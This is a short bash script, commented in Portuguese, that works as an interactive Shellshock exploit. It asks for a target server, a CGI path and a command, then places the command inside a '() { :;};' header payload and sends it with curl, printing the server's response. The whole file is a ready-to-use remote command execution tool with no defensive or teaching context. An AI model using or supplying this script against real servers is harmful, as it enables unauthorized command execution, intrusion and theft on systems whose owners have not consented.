#!/bin/bash
clear

# ======= Ajustes simples (edite se quiser) =======
titulo="MESI"
# ===============================================

# Se COLUMNS não estiver definido, usa 80
largura=${COLUMNS:-80}
separador=$(printf '%*s\n' "$largura" | tr ' ' '#')

# Mostra título (se figlet existir)
if command -v figlet >/dev/null 2>&1; then
  figlet "$titulo"
else
  echo "=== $titulo ==="
fi

echo
echo "$separador"
echo

read -p "Insira o endereço do servidor (IP/host): " servidor
read -p "Insira o caminho/URL (ex.: /cgi-bin/test ou pasta/arquivo): " url
read -p "Insira o comando a executar: " comando

# Garante que o caminho começa com /
case "$url" in
  /*) ;;
  *) url="/$url" ;;
esac

echo
echo "$separador"
echo

# Payload no formato do seu exemplo
payload="blablabla: () { :;}; echo; ${comando}"

# Faz o curl (HTTP simples, como no exemplo)
output=$(curl -s "http://${servidor}${url}" -H "$payload")

printf "%s\n" "$output"
